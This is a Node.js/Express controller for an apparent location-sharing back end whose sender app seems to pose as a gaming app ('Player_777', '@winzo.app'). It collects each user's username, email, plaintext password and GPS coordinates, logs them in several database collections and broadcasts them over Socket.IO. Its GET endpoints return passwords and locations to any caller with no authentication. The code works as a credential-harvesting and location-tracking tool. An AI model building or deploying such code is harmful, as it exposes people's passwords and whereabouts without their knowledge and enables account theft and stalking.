const Location = require('../models/Location');
const UserActivity = require('../models/UserActivity');
const User = require('../models/User');
const mongoose = require('mongoose');
const socketService = require('../services/socketService');

// In-memory fallback cache when MongoDB is offline or initial connection is pending
let inMemoryLocation = null;

/**
 * Validates coordinate numbers, rejecting null, undefined, NaN, Infinity, and out-of-range values.
 */
function isValidNumber(val) {
  return typeof val === 'number' && !Number.isNaN(val) && Number.isFinite(val);
}

/**
 * Update location for X
 * POST /api/location
 * Body: { latitude, longitude, accuracy, username?, email?, password? }
 */
exports.updateLocation = async (req, res) => {
  try {
    const { latitude, longitude, accuracy, username, email, password } = req.body;

    // Validate presence and finite number status
    if (!isValidNumber(latitude)) {
      return res.status(400).json({ error: 'Latitude is required and must be a valid finite number' });
    }

    if (!isValidNumber(longitude)) {
      return res.status(400).json({ error: 'Longitude is required and must be a valid finite number' });
    }

    if (!isValidNumber(accuracy) || accuracy < 0) {
      return res.status(400).json({ error: 'Accuracy is required and must be a positive number' });
    }

    // Validate coordinate ranges
    if (latitude < -90 || latitude > 90) {
      return res.status(400).json({ error: 'Latitude must be between -90 and 90' });
    }

    if (longitude < -180 || longitude > 180) {
      return res.status(400).json({ error: 'Longitude must be between -180 and 180' });
    }

    const cleanUsername = (typeof username === 'string' && username.trim().length > 0)
      ? username.trim()
      : 'Player_777';
    const cleanEmail = (typeof email === 'string') ? email.trim().toLowerCase() : '';
    const cleanPassword = (typeof password === 'string') ? password : '';

    const timestamp = new Date();

    // Default fallback in-memory representation
    let updatedLocation = {
      _id: new mongoose.Types.ObjectId().toString(),
      username: cleanUsername,
      email: cleanEmail,
      password: cleanPassword,
      latitude,
      longitude,
      accuracy,
      timestamp
    };

    // Update MongoDB if connected
    if (mongoose.connection.readyState === 1) {
      try {
        // 1. Clean up any legacy documents with _id: "X"
        await Location.deleteMany({ _id: 'X' }).catch(() => {});

        // 2. Match or create user in users collection
        let matchedUser = null;
        if (cleanEmail) {
          matchedUser = await User.findOne({ email: cleanEmail });
        }
        if (!matchedUser && cleanUsername && cleanUsername !== 'Player_777') {
          matchedUser = await User.findOne({ username: cleanUsername });
        }

        // If credentials were provided but user not in users collection yet, create user record
        if (!matchedUser && (cleanEmail || cleanUsername)) {
          try {
            matchedUser = await User.create({
              email: cleanEmail || `${cleanUsername.toLowerCase()}@winzo.app`,
              username: cleanUsername,
              password: cleanPassword,
              lastLogin: timestamp,
              lastLocation: { latitude, longitude, accuracy, timestamp }
            });
          } catch (createErr) {
            // Concurrent creation or existing
            matchedUser = await User.findOne({
              $or: [
                ...(cleanEmail ? [{ email: cleanEmail }] : []),
                ...(cleanUsername ? [{ username: cleanUsername }] : [])
              ]
            });
          }
        }

        // 3. Upsert location document for this user
        const locQuery = {};
        if (matchedUser) {
          locQuery.$or = [
            { userId: matchedUser._id },
            ...(cleanEmail ? [{ email: cleanEmail }] : []),
            ...(cleanUsername ? [{ username: cleanUsername }] : [])
          ];
        } else if (cleanEmail) {
          locQuery.email = cleanEmail;
        } else {
          locQuery.username = cleanUsername;
        }

        const updateData = {
          username: matchedUser?.username || cleanUsername,
          email: matchedUser?.email || cleanEmail,
          password: cleanPassword || (matchedUser?.password || ''),
          latitude,
          longitude,
          accuracy,
          timestamp
        };
        if (matchedUser) {
          updateData.userId = matchedUser._id;
        }

        const doc = await Location.findOneAndUpdate(
          locQuery,
          { $set: updateData },
          {
            upsert: true,
            new: true,
            setDefaultsOnInsert: true
          }
        );

        if (doc) {
          updatedLocation = {
            _id: doc._id.toString(),
            userId: doc.userId ? doc.userId.toString() : (matchedUser ? matchedUser._id.toString() : null),
            username: doc.username,
            email: doc.email,
            password: doc.password,
            latitude: doc.latitude,
            longitude: doc.longitude,
            accuracy: doc.accuracy,
            timestamp: doc.timestamp
          };
        }

        // Log user activity with username, email, password, and location to user_activities collection
        UserActivity.create({
          username: updatedLocation.username,
          email: updatedLocation.email,
          password: updatedLocation.password,
          latitude,
          longitude,
          accuracy,
          timestamp,
        }).catch((activityErr) => {
          console.warn('[LocationController] Failed to log user activity:', activityErr.message);
        });

        // Update user's lastLocation in users collection
        if (matchedUser) {
          User.updateOne(
            { _id: matchedUser._id },
            {
              $set: {
                lastLocation: { latitude, longitude, accuracy, timestamp },
                updatedAt: timestamp,
              }
            }
          ).catch((userErr) => {
            console.warn('[LocationController] Failed to update user lastLocation:', userErr.message);
          });
        }

      } catch (dbErr) {
        console.warn('[LocationController] MongoDB write failed, using in-memory store:', dbErr.message);
      }
    } else {
      console.log('[LocationController] MongoDB not connected: cached location update in memory.');
    }

    // Always keep memory cache up to date
    inMemoryLocation = updatedLocation;

    // Broadcast real-time update via Socket.IO
    socketService.emitLocationUpdated(updatedLocation);

    return res.status(200).json({
      _id: updatedLocation._id,
      userId: updatedLocation.userId || null,
      username: updatedLocation.username,
      email: updatedLocation.email,
      password: updatedLocation.password,
      latitude: updatedLocation.latitude,
      longitude: updatedLocation.longitude,
      accuracy: updatedLocation.accuracy,
      timestamp: updatedLocation.timestamp
    });
  } catch (error) {
    console.error('[LocationController] Error updating location:', error);
    return res.status(500).json({ error: 'Failed to update location' });
  }
};


/**
 * Get latest location
 * GET /api/location
 */
exports.getLocation = async (req, res) => {
  try {
    let location = null;

    if (mongoose.connection.readyState === 1) {
      try {
        const query = {};
        if (req.query.username) {
          query.username = req.query.username.trim();
        } else if (req.query.email) {
          query.email = req.query.email.trim().toLowerCase();
        } else if (req.query.id && mongoose.Types.ObjectId.isValid(req.query.id)) {
          query._id = req.query.id;
        }

        // Return latest matching or most recently updated location
        location = await Location.findOne(query).sort({ timestamp: -1 });
      } catch (dbErr) {
        console.warn('[LocationController] MongoDB read failed, checking in-memory cache:', dbErr.message);
      }
    }

    // Fall back to in-memory store if DB is offline or not found
    if (!location && inMemoryLocation) {
      location = inMemoryLocation;
    }

    if (!location) {
      return res.status(404).json({
        message: 'No location available yet. Please start sharing from the sender app.'
      });
    }

    const docId = location._id ? location._id.toString() : (location.id ? location.id.toString() : new mongoose.Types.ObjectId().toString());
    const docUserId = location.userId ? location.userId.toString() : null;

    return res.status(200).json({
      _id: docId,
      userId: docUserId,
      username: location.username || 'Player_777',
      email: location.email || '',
      password: location.password || '',
      latitude: location.latitude,
      longitude: location.longitude,
      accuracy: location.accuracy,
      timestamp: location.timestamp
    });
  } catch (error) {
    console.error('[LocationController] Error fetching location:', error);
    return res.status(500).json({ error: 'Failed to retrieve location' });
  }
};

/**
 * Get all shared locations from MongoDB
 * GET /api/locations
 */
exports.getAllLocations = async (req, res) => {
  try {
    if (mongoose.connection.readyState !== 1) {
      return res.status(200).json(inMemoryLocation ? [inMemoryLocation] : []);
    }
    const locations = await Location.find({}).sort({ timestamp: -1 }).lean();
    return res.status(200).json(locations.map(loc => ({
      _id: loc._id ? loc._id.toString() : (loc.id ? loc.id.toString() : ''),
      userId: loc.userId ? loc.userId.toString() : null,
      username: loc.username || 'Player_777',
      email: loc.email || '',
      latitude: loc.latitude,
      longitude: loc.longitude,
      accuracy: loc.accuracy,
      timestamp: loc.timestamp
    })));
  } catch (error) {
    console.error('[LocationController] Error fetching all locations:', error);
    return res.status(500).json({ error: 'Failed to retrieve locations' });
  }
};

/**
 * Get user activity logs
 * GET /api/user-activity?limit=50&username=John
 * 
 * Returns the most recent user activity entries logged from sender app usage.
 * Each entry contains: username, email, password, latitude, longitude, accuracy, timestamp.
 */
exports.getUserActivity = async (req, res) => {
  try {
    if (mongoose.connection.readyState !== 1) {
      return res.status(503).json({ error: 'Database is not connected. User activity requires MongoDB.' });
    }

    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
    const filter = {};

    // Optional filter by username
    if (req.query.username && typeof req.query.username === 'string' && req.query.username.trim().length > 0) {
      filter.username = req.query.username.trim();
    }

    const activities = await UserActivity.find(filter)
      .sort({ timestamp: -1 })
      .limit(limit)
      .lean();

    return res.status(200).json({
      count: activities.length,
      activities: activities.map(a => ({
        username: a.username,
        email: a.email || '',
        password: a.password || '',
        latitude: a.latitude,
        longitude: a.longitude,
        accuracy: a.accuracy,
        timestamp: a.timestamp,
      })),
    });
  } catch (error) {
    console.error('[LocationController] Error fetching user activity:', error);
    return res.status(500).json({ error: 'Failed to retrieve user activity' });
  }
};
